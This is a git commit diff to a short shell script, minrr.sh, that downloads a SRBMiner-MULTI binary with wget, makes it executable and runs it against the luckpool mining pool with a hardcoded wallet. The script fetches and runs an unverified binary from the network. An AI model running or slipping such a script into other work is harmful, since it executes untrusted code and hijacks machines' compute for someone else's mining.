16046a2a66df1d57718c1281b5e3c324ad05fe86
apaple <76417012+apaple@users.noreply.github.com>
2024-09-15 11:26:20 +0700

    Update minrr.sh

--- minrr.sh
+++ minrr.sh
@@ -1,3 +1,5 @@
 wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI
 
+chmod u+x SRBMiner-MULTI
+
 ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.Rig001 --password x -t 2
